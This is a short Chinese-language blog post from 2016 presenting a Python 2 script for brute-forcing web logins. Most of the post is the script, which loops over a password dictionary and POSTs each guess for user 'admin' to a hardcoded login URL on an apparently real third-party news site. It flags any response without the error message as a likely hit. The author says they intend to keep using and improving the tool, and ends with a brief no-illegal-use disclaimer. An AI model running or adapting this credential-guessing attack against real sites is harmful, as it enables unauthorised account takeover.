---
title: python-爆破工具
date: 2016-12-23 11:28:09
tags:
---
写这个工具的目的是为了爆破哪些发包需要经过一次302跳转的登陆地址，利用python写比较容易，所以就拿来练手。以后毕竟还要用，估计会继续完善。但是中间有两点问题：
1. 发包的速度比较慢，如果需要的话可以采用多线程的方式。
2. 由于网络不稳定的原因，对于内容比较大的字典爆破可能会中断，错误码10060.
这个问题还需要研究一下。
![chritsmas](/upload_image/lu33.jpg)
## 一更
### 源码：
```bash
#!coding=utf-8

import urllib2
import urllib

List=open("pass.txt",'r')		#加入/修改字典

lst=List.readlines()			#读取文件中的所有行并返回一个列表，并赋值给lst
for psd in lst:
	postdata=urllib.urlencode({
		'username':'admin',
		'password':psd,
	})									#提交post数据
	print 'password is: '+ str(psd)		#输出用来爆破的密码，用户名为admin
	req=urllib2.Request(
		url='http://www.chinanews-info.com/pub/index.jsp?fail=3',
		data=postdata
	)									#在这里加入/修改爆破的网址
	response=urllib2.urlopen(req)		#赋值回包给response
	the_page=response.read()			#读取回包的数据

	item='用户密码错误'
	if item in the_page:
		print u'密码不正确，继续破解--'
	else:
		print u'密码可能是: '+ str(psd)

```
---
工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。
---

### sign:bman